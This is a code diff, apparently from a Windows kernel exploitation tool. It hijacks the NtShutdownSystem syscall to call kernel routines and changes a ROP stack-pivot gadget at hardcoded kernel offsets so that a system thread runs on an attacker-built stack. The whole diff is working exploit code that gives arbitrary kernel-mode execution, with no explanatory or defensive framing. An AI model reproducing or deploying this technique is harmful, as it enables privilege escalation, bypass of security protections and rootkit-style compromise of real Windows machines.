@@ -34,6 +34,7 @@ int main()
     const void* NtShutdownSystem = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtShutdownSystem");
 
     KernelCaller.RedirectCallByName("NtShutdownSystem", "MmAllocateContiguousMemory");
+    void* PivotDataAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x58, (void*)MAXULONG64);
     void* DummyMemoryAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
     void* IntervalArgAllocation = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x20, (void*)MAXULONG64);
     void* CurrentStackOffsetAddress = reinterpret_cast<void* (*)(std::size_t, void*)>(NtShutdownSystem)(0x8, (void*)MAXULONG64);
@@ -45,7 +46,7 @@ int main()
     std::printf("[+] Original Stack @ 0x%p\n", OriginalStackAllocation);
     std::printf("[+] Current Stack Offset @ 0x%p\n", CurrentStackOffsetAddress);
 
-    if (!StackAllocation || !OriginalStackAllocation || !CurrentStackOffsetAddress || !StackLimitStoreAddress)
+    if (!StackAllocation || !OriginalStackAllocation || !CurrentStackOffsetAddress || !StackLimitStoreAddress || !PivotDataAllocation)
         return EXIT_FAILURE;
 
     // Zero out stack allocation
@@ -166,7 +167,12 @@ int main()
 
     std::uint64_t CurrentStackOffsetStartValue = 0x2000;
 
+    void* PivotJumpAddress = (void*)(Driver::GetKernelModuleBase() + 0x20043b);
+    void* NewRspAddress = (void*)((uint64_t)StackAllocation + 0x2000);
+
     KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
+    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uint64_t)PivotDataAllocation + 0x50), &PivotJumpAddress, sizeof(PivotJumpAddress));
+    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uint64_t)PivotDataAllocation + 0x10), &NewRspAddress, sizeof(NewRspAddress));
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(IntervalArgAllocation, &SleepInterval, sizeof(SleepInterval));
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(CurrentStackOffsetAddress, &CurrentStackOffsetStartValue, sizeof(CurrentStackOffsetStartValue));
     reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)((void*)((uintptr_t)StackAllocation + 0x2000), KernelStackManager.GetStackBuffer(), KernelStackManager.GetStackSize());
@@ -176,11 +182,11 @@ int main()
     Sleep(500);
     std::cin.get();
 
-    void* BootstrapGadget = (void*)(Driver::GetKernelModuleBase() + 0x9bdb51); // push rcx; pop rsp; test edx, edx; je 0x9b8acd; add rsp, 0x28; ret;
-    void* OffsetedStackAllocation = (void*)((std::uintptr_t)StackAllocation + 0x2000 - 0x28); // account for 0x28 being added in gadget
+    // mov rdx, qword ptr [rcx + 0x50]; mov rbp, qword ptr [rcx + 0x18]; mov rsp, qword ptr [rcx + 0x10]; jmp rdx;
+    void* BootstrapGadget = (void*)(Driver::GetKernelModuleBase() + 0x698bd0);
 
     HANDLE KernelThreadHandle;
-    KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)BootstrapGadget, OffsetedStackAllocation);
+    KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)BootstrapGadget, PivotDataAllocation);
     NTSTATUS ThreadCreation = reinterpret_cast<NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE)>(NtShutdownSystem)(
         &KernelThreadHandle,
         THREAD_ALL_ACCESS,
